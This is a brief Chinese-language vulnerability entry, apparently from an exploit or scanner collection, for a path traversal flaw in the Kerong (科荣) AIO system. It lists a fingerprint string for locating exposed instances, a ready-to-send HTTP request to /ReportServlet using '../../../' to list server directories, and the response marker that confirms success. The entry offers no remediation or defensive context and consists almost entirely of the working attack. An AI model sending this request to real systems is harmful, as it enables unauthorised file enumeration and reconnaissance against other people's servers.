# 科荣AIO目录遍历漏洞

科荣AIO ｜ 路径遍历 ｜ —
- **指纹**：`"changeAccount('8000')"`
- **请求**：`GET /ReportServlet?operation=getFileList&path=../../../ HTTP/1.1`
- **响应特征**：200 fileList